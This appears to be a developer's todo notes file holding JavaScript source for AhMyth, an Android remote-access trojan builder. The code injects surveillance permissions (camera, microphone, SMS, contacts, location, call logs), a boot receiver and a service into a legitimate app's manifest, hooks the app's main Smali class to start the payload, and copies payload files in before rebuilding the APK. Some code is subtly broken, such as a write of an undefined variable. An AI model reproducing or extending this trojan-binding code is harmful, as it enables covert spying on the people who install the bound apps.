## Todo 01: `modifyManifest` function
> contains updated callback error printing for XML parsing as well as updated code for `BindOnBoot` and `BindOnLaunch` to reflect new changes in `modifyManifest`
<details>
  
```js
$appCtrl.modifyManifest = (data, callback) => {
    var checkBoxofCamera = document.getElementById("Permissions1");
    var checkBoxofStorage = document.getElementById("Permissions2");
    var checkBoxofMic = document.getElementById("Permissions3");
    var checkBoxofLocation = document.getElementById("Permissions4");
    var checkBoxofContacts = document.getElementById("Permissions5");
    var checkBoxofSms = document.getElementById("Permissions6");
    var checkBoxofCallsLogs = document.getElementById("Permissions7");

    // default permissions for the payload
    const permissions = CONSTANTS.permissions;

    // Create an array to store the selected permissions
    var selectedPermissions = [];

    // Check each checkbox and add the corresponding permission to the selectedPermissions array
    if (checkBoxofCamera.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
    }
    if (checkBoxofStorage.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
    }
    if (checkBoxofMic.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
    }
    if (checkBoxofLocation.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
    }
    if (checkBoxofContacts.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
    }
    if (checkBoxofSms.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
    }
    if (checkBoxofCallsLogs.checked) {
        selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
    }

    // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
    if (
        checkBoxofCamera.checked &&
        checkBoxofStorage.checked &&
        checkBoxofMic.checked &&
        checkBoxofLocation.checked &&
        checkBoxofContacts.checked &&
        checkBoxofSms.checked &&
        checkBoxofCallsLogs.checked
    ) {
        selectedPermissions = permissions;
    }

    // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
    if (
        !checkBoxofCamera.checked &&
        !checkBoxofStorage.checked &&
        !checkBoxofMic.checked &&
        !checkBoxofLocation.checked &&
        !checkBoxofContacts.checked &&
        !checkBoxofSms.checked &&
        !checkBoxofCallsLogs.checked
    ) {
        selectedPermissions = permissions;
    }

    delayedLog('[★] Parsing the Android Manifest XML Data...');

    // Convert data to a string if it's not already a string
    if (typeof data !== 'string') {
        data = data.toString();
    }

    xml2js.parseString(data, {
        explicitArray: false
    }, (err, result) => {
        if (err) {
            const callbackErrors = [
                '[x] Unable to Parse the Android Manifest XML Data!',
                '[¡] Error written to "Parsing.log" on... ' + CONSTANTS.logStatus.INFO,
                logPath,
            ];
            WriteErrorLog(err, 'Parsing.log');
            callback({
                message: callbackErrors[0],
                callbackErrors,
            });
            return;
        }

        const manifestObj = result.manifest;

        // Check if receiver and service properties are arrays
        if (!Array.isArray(manifestObj.application.receiver)) {
            manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver]: [];
        }

        if (!Array.isArray(manifestObj.application.service)) {
            manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service]: [];
        }

        // store existing permissions
        const existingPermissions = new Set();

        // Check if permissions already exist in the manifest
        if (manifestObj['uses-permission']) {
            if (!Array.isArray(manifestObj['uses-permission'])) {
                manifestObj['uses-permission'] = [manifestObj['uses-permission']];
            }
            manifestObj['uses-permission'].forEach((permission) => {
                existingPermissions.add(permission.$['android:name']);
            });
        } else {
            manifestObj['uses-permission'] = [];
        }

        // Check if features already exist in the manifest
        if (manifestObj['uses-feature']) {
            if (!Array.isArray(manifestObj['uses-feature'])) {
                manifestObj['uses-feature'] = [manifestObj['uses-feature']];
            }
            manifestObj['uses-feature'].forEach((feature) => {
                existingPermissions.add(feature.$['android:name']);
            });
        } else {
            manifestObj['uses-feature'] = [];
        }

        // Filter selected permissions to exclude duplicates
        const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
            return self.indexOf(permission) === index && !existingPermissions.has(permission);
        });

        delayedLog('[★] Injecting AhMyth Payload Permissions...');

        // Add new permissions and features based on filteredPermissions
        filteredPermissions.forEach(permission => {
            if (permission === 'android.hardware.camera') {
                manifestObj['uses-feature'].push({
                    $: {
                        'android:name': 'android.hardware.camera'
                    },
                    _: '' // Add empty string as element text
                });
            }

            if (permission === 'android.hardware.camera.autofocus') {
                manifestObj['uses-feature'].push({
                    $: {
                        'android:name': 'android.hardware.camera.autofocus'
                    },
                    _: '' // Add empty string as element text
                });
            }

            if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                manifestObj['uses-permission'].push({
                    $: {
                        'android:name': permission
                    },
                    _: '' // Add empty string as element text
                });
            }
        });

        delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

        // Construct the receiver and service tags using constants
        const receiverTag = {
            $: {
                'android:enabled': 'true',
                'android:exported': 'true',
                'android:name': CONSTANTS.ahmythReceiver,
            },
            'intent-filter': {
                action: {
                    $: {
                        'android:name': 'android.intent.action.BOOT_COMPLETED',
                    },
                },
            },
        };

        const serviceTag = {
            $: {
                'android:enabled': 'true',
                'android:exported': 'false',
                'android:name': CONSTANTS.ahmythService,
            },
        };

        // Add the receiver and service tags to the application node
        manifestObj.application.receiver.push(receiverTag);
        manifestObj.application.service.push(serviceTag);

        const builder = new xml2js.Builder({
            renderOpts: {
                pretty: true,
                indent: '    '
            },
            headless: true
        });

        // Modify the parsed object by finding and updating the closing application tag
        const closingAppTag = '</application>';
        const modifiedClosingAppTag = '\n  </application>';
        const xmlString = builder.buildObject(result);
        const modifiedXml = xmlString.replace(closingAppTag,
            modifiedClosingAppTag);

        // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
        const closingManifestTag = '</manifest>';
        const finalModifiedXml = modifiedXml.replace(closingManifestTag,
            '</manifest>');

        callback(null,
            finalModifiedXml);
    });
};

$appCtrl.BindOnBoot = (apkFolder) => {
    const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');

    delayedLog('[★] Reading the Android Manifest XML File...')
    fs.readFile(manifestPath, 'utf8', (error,
        data) => {
        if (error) {
            delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
            WriteErrorLog(error, 'Reading.log');
            delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
            delayedLog(logPath, CONSTANTS.logStatus.INFO);
            return;
        }

        $appCtrl.modifyManifest(data, (err, finalModifiedXml) => {
            if (err) {
                // Handle the error and print the callback errors
                delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                if (err.callbackErrors) {
                    err.callbackErrors.forEach((errorMsg) => {
                        delayedLog(errorMsg, CONSTANTS.logStatus.FAIL);
                    });
                }
                return;
            }

            delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
            fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
                if (error) {
                    delayedLog('[x] Unable to Write Payload Injections back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                    WriteErrorLog(error, 'Writing.log');
                    delayedLog('[¡] Error written to "Writing.log" on... ', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder)
            });
        });
    });
};

// "Bind On Launch" method
$appCtrl.BindOnLauncher = (apkFolder) => {
    const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');

    delayedLog('[★] Reading the Android Manifest XML File...');
    fs.readFile(manifestPath, 'utf8', (error, data) => {
        if (error) {
            delayedLog('[x] Unable to Read the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
            WriteErrorLog(error, 'Reading.log');
            delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
            delayedLog(logPath, CONSTANTS.logStatus.INFO);
            return;
        }

        $appCtrl.modifyManifest(data, (err, finalModifiedXml) => {
            if (err) {
                // Handle the error and print the callback errors
                delayedLog(err.message, CONSTANTS.logStatus.FAIL);
                if (err.callbackErrors) {
                    err.callbackErrors.forEach((errorMsg) => {
                        delayedLog(errorMsg, CONSTANTS.logStatus.FAIL);
                    });
                }
                return;
            }

            delayedLog('[★] Writing Payload Injections Back to the Android Manifest XML File...');
            fs.writeFile(manifestPath, finalModifiedManifest, 'utf8', (error) => {
                if (error) {
                    delayedLog('[x] Unable to Write Payload Injection back to the Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                    WriteErrorLog(error, 'Writing.log');
                    delayedLog('[¡] Error written to "Writing.log" on... ', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog('[★] Reading the Modified Android Manifest XML File...')
                fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                    if (error) {
                        delayedLog('[x] Unable to Read the Modified Android Manifest XML File!', CONSTANTS.logStatus.FAIL);
                        WriteErrorLog(error, 'Reading.log');
                        delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Parsing the Modified Android Manifest XML Data...')
                    xml2js.parseString(data, (err, result) => {
                        if (err) {
                            delayedLog('[x] Unable to Parse the Modified Android Manifest XML Data!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(err, 'Parsing.log');
                            delayedLog('[¡] Error written to "Parsing.log" on... ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        delayedLog('[★] Searching the Modified Android Manifest for a Suitable Main Class...');

                        const launcherActivity = GetLauncherActivity(result, apkFolder);
                        if (launcherActivity === -1) {
                            delayedLog('[x] Cannot Locate a Suitable Main Class in the Manifest!', CONSTANTS.logStatus.FAIL);
                            delayedLog('[x] Please use Another APK as a Template!.', CONSTANTS.logStatus.FAIL);
                            return;
                        }

                        delayedLog('[★] Locating the Main Class Smali File...');
                        const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                            if (err) {
                                delayedLog('[x] Unable to Locate the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                delayedLog('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                                return;
                            } else {
                                delayedLog('[¡] Main Class Smali File Found: ' + launcherPath, CONSTANTS.logStatus.INFO);
                            }

                            delayedLog('[★] Reading the Main Class Smali File...');
                            fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                if (error) {
                                    delayedLog('[x] Unable to Read the Main Smali Class File!', CONSTANTS.logStatus.FAIL);
                                    WriteErrorLog(error, 'Reading.log');
                                    delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                                var hook = CONSTANTS.hookPoint;

                                delayedLog('[★] Injecting AhMyth Hook into the Main Class Smali File...');

                                var output = data.replace(hook, startService);
                                fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                    if (error) {
                                        delayedLog('[x] Unable to Hook the Main Class Smali File!', CONSTANTS.logStatus.FAIL);
                                        WriteErrorLog(error, 'Writing.log');
                                        delayedLog('[¡] Error written to "Writing.log" on... ', CONSTANTS.logStatus.INFO);
                                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                        return;
                                    }

                                    delayedLog('[★] Reading the Target SDK Version in the Manifest...');
                                    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                                        if (error) {
                                            delayedLog('[x] Unable to Read the Target SDK Version in the Manifest!', CONSTANTS.logStatus.FAIL);
                                            WriteErrorLog(error, 'Reading.log');
                                            delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
                                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                            return;
                                        }

                                        delayedLog('[★] Modifying the Target SDK Version in the Manifest...');

                                        var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                        var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                        var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                        var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                                        var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                        .replace(compSdkVerNameRegex, "$111" + '"')
                                        .replace(platVerCoRegex, "$122" + '"')
                                        .replace(platVerNameRegex, "$111" + '"');

                                        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
                                            if (error) {
                                                delayedLog('[x] Unable to Modify the Target SDK in the Manifest!', CONSTANTS.logStatus.FAIL);
                                                WriteErrorLog(error, 'Writing.log');
                                                delayedLog('[¡] Error written to "Writing.log" on... ', CONSTANTS.logStatus.INFO);
                                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                return;
                                            }
                                            delayedLog('[★] Reading the Target SDK Version in the "apktool.yml" File...')
                                            fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                                if (error) {
                                                    delayedLog('[x] Unable to Read the Target SDK version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                    WriteErrorLog(error, 'Reading.log');
                                                    delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
                                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                    return;
                                                }
                                                delayedLog('[★] Modifying the Target SDK Version in the "apktool.yml" File...')
                                                var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                                var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                                var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                                .replace(tarSdkRegex, "$122'");

                                                fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                    if (error) {
                                                        delayedLog('[x] Unable to Modify the Target SDK Version in the "apktool.yml" File!', CONSTANTS.logStatus.FAIL);
                                                        WriteErrorLog(error, 'Writing.log');
                                                        delayedLog('[¡] Error written to "Writing.log" on... ', CONSTANTS.logStatus.INFO);
                                                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                                        return;
                                                    }
                                                    $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    });
};
```
</details>
<br></br>

## Todo 06: function to check the users JDK Version using *child_process*
> If this works the way I need it to, then it will stop any building or binding process if the users JDK version is not 11.x.
>> The function should only consider the major version number *11*.
<details>
  
```js
const { exec } = require('child_process');

function checkJavaVersion(callback) {
  exec('java -version', (error, stdout, stderr) => {
    if (error) {
      callback(new Error('Java is not installed or not accessible.'));
    } else {
      const versionOutput = stderr || stdout;
      const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
      if (versionMatch) {
        const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
        if (majorVersion === 11) {
          callback(null, majorVersion);
        } else {
          callback(new Error('JDK Version is not 11.x, Aborting!'));
        }
      } else {
        callback(new Error('Java is not installed or not accessible.'));
      }
    }
  });
}

// Usage example:
checkJavaVersion((error, javaVersion) => {
  if (error) {
    delayedLog(error.message);
    // Abort processes here
  } else {
    // Continue with processes here, since Java version is 11
  }
});
```
</details>
<br></br>

## Todo 07: 32bit arch deprecation warning
> I'm sad to have to implement this, but unfortunately theres nothing i can do about it.
<details>
  
```js
const architecture = process.arch;
if (architecture === 'ia32') {
    delayedLog('Warning: AhMyth will be deprecated for all 32bit architectures when Apktool reaches v3.0.0 in the future.', CONSTANTS.logStatus.WARNING);
}
```
</details>
<br></br>

## Todo 05 + Todo 08: `createPayloadDirectory` function
> This function wrap also fixes the MAJOR binding bug currently present in *Beta.5*
<details>

```js
$appCtrl.createPayloadDirectory = (files) => {
    var ignoreDirs = ['original',
        'res',
        'build',
        'kotlin',
        'lib',
        'assets',
        'META-INF',
        'unknown',
        'smali_assets'];
    var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
    var collator = new Intl.Collator([], {
        numeric: true
    });
    smaliList.sort((a, b) => collator.compare(a, b));
    var lastSmali = smaliList[smaliList.length - 1];

    if (lastSmali == "smali") {
        payloadSmaliFolder = '/smali_classes2';
        return payloadSmaliFolder;
    } else {
        var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
        var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
        var newSmaliNumber = lastSmaliNumber + 1;
        var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
        return payloadSmaliFolder;
    }
};

$appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

    delayedLog('[★] Reading the Decompiled Original Application...')
    fs.readdir(apkFolder, {
        withFileTypes: true
    }, (error, files) => {
        if (error) {
            delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
            WriteErrorLog(error, 'Reading.log');
            delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
            delayedLog(logPath, CONSTANTS.logStatus.INFO);
            return;
        }

        const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
        const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

        delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
        fs.mkdir(targetPayloadFolder, {
            recursive: true
        }, (error) => {
            if (error) {
                delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                return;
            }

            delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
            fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                overwrite: true
            }, (error) => {
                if (error) {
                    delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                    WriteErrorLog(error, 'Copying');
                    delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                // Copy android directory to the smali folder in the apkFolder
                fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                        WriteErrorLog(error, 'Copying "android" directory');
                        delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy androidx directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(error, 'Copying "androidx" directory');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Remove the original 'android' and 'androidx' directories
                        fs.rm(dir.join(targetPayloadFolder, 'android'), {
                            recursive: true
                        });
                        fs.rm(dir.join(targetPayloadFolder, 'androidx'), {
                            recursive: true
                        });

                        // Continue with Apk generation
                        $appCtrl.GenerateApk(apkFolder);
                    });
                });
            });
        });
    });
}
```
</details>
